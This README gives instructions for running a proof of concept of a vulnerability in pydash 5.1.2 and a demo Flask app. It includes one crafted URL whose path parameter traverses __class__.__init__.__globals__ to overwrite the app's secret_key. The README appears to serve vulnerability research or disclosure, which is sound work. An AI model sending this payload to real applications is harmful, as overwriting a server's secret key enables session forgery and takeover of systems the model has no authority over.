
**Instructions for pydash 5.1.2 and flask PoC**

**Prerequisites:** python3.x, pip

* create a python virtualenv if you don't want to taint your python installation with vulnerable packages, for example:
    1. python3 -m venv env
    2. source /env/bin/activate
* install vulnerable packages in the environment
    1. pip install -r requirements.txt 
* run the proof of concept
    1. python3 pydash_poc_5.1.2.py
* run flask proof of concept
    1. flask --debug --app flask_poc.py run
    2. open browser and enter following url: ```http://127.0.0.1:5000/?path=__class__.__init__.__globals__.app.secret_key&val='1337'```
    3. result will be printed in the terminal window running the flask server
